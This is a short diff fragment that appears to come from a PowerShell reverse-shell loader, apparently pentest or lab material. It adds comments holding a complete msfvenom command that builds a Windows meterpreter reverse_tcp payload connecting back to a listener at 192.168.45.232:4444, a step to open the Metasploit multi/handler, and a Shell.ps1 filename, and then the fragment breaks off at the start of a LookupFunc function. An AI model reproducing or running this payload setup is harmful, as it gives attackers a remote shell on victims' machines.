@@ -1,4 +1,8 @@
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.232 LPORT=4444 EXITFUNC=thread -f ps1
 
+# Open msfconsole multi.handler
+
+# Shell.ps1
 
 
 function LookupFunc {
